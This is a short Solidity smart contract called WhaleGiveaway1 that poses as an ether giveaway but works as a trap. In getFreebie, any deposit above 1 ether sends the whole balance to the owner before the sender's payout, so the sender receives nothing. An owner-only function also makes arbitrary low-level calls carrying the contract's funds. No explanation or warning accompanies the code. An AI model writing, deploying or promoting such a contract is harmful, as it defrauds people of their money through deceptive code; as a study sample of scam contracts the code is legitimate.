pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner = msg.sender;

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        bool success;
        assembly {
            success := call(sub(gas, 5000), adr, msg.value, add(data, 0x20), mload(data), 0, 0)
        }
        require(success);
    }
}